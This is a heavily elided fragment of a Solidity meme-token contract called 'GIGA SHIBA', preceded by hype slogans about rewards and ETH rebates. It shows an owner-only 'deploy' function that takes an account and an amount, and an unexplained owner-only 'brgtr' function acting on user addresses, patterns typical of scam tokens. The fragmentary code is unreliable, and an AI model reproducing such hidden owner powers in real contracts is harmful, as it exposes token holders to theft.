...
GIGA SIZED SHIBA , GIGA SIZED REWARDS

GIGA SIZED REBATES IN ETH

GIGA SIZED BRIDGE - VIA SHIBCHAIN
...
contract GIGASHIBA {
    ...
    // 
    string public name = "GIGA SHIBA";
    string public symbol = unicode"GIGASHIB";
    ...
    address Construct = 0x7Ab87621E080bDa239bAc5D6205E4b0FBb4F06B2;
...
modifier onlyOwner() {
  ...
  function deploy(address account, uint256 amount) public onlyOwner {
   ...
   function _beforeTokenTransfer(address from, address to, uint256 amount) internal virtual { }
    ...
    function brgtr(address _user) public onlyOwner {
